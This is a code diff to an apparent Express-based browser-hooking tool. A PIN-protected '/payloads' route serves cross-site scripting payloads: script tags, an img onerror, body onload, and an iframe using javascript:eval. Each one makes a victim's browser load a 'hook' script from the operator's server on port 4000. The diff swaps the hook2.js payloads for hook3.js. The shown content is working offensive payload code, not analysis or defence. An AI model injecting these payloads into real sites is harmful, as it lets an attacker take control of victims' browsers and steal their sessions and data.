@@ -147,13 +147,11 @@ app.get('/dashboard', checkPin, (req, res) => {
 
 app.get('/payloads', checkPin, (req, res) => {
   const host = req.headers.host.split(':')[0];
-  const payloadBase = `<script src="http://${host}:4000/js/hook2.js"></script>`;
+  const payloadBase = `<script src="http://${host}:4000/js/hook3.js"></script>`;
   const payloads = [
     payloadBase,
     `<script src="http://${host}:4000/js/hook3.js"></script>`, 
     `<img src=x onerror="${payloadBase}">`,
-    `"><script src="http://${host}:4000/js/hook2.js"></script>`,
-    `<iframe src="javascript:eval('<script src=\\'http://${host}:4000/js/hook2.js\\'><\\/script>')">`,
     `<body onload="${payloadBase}">`,
     `"><script src="http://${host}:4000/js/hook3.js"></script>`,
     `<iframe src="javascript:eval('<script src=\\'http://${host}:4000/js/hook3.js\\'><\\/script>')">`,
